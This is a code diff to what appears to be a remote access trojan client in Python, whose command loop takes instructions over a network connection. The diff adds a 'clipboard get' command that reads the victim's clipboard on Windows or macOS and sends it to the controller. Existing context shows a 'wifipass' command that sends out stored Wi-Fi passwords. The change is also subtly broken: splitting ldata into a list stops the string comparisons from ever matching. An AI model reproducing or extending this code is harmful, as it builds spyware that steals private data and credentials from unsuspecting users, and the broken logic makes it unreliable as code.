@@ -108,7 +108,7 @@ def run_commands():
                 has_ben_defed = 1
             data_d = data[:].decode("utf-8")
             Directory = re.match("(?:cd) (.*)", data_d)
-            ldata = data[:].decode("utf-8").lower()
+            ldata = data[:].decode("utf-8").lower().split()
             if "speak " in ldata:
                 ogl = 0
                 xy = 8
@@ -123,8 +123,18 @@ def run_commands():
                         pyttsx3.speak(d_data_split[int(ogl)])
                     except IndexError:
                         run_commands()
-
-            if ldata == "wifipass" or ldata == "wifi pass" or ldata == "wifi pass " or ldata == "wifipass ":
+            elif ldata == "clipboard get":
+                if "win" in oss:
+                    clipboard_content = subprocess.check_output(
+                                "powershell get-clipboard", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    connection.send(str.encode(str(clipboard_content)))
+                elif "mac" in oss:
+                    clipboard_content = subprocess.check_output(
+                                "pbpaste", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    connection.send(str.encode(str(clipboard_content)))
+                else:
+                    connection.send(str.encode("Sorry, but this command is only available for windows and mac os"))
+            elif ldata == "wifipass" or ldata == "wifi pass":
                 pn = 0
                 dub = 9
                 while dub == 9:
@@ -144,7 +154,7 @@ def run_commands():
                         connection.send(str.encode(str(something)))
                         dub = 10
 
-            if "pubip" not in ldata and "wifipass" not in ldata:
+            elif "pubip" not in ldata and "wifipass" not in ldata:
                 if ldata != "download" and "cd " not in ldata and "cd.." not in ldata and has_ben_defed == 1:
                     connection.send(str.encode(
                         str(output_str) + str(os.getcwd()) + '> '))
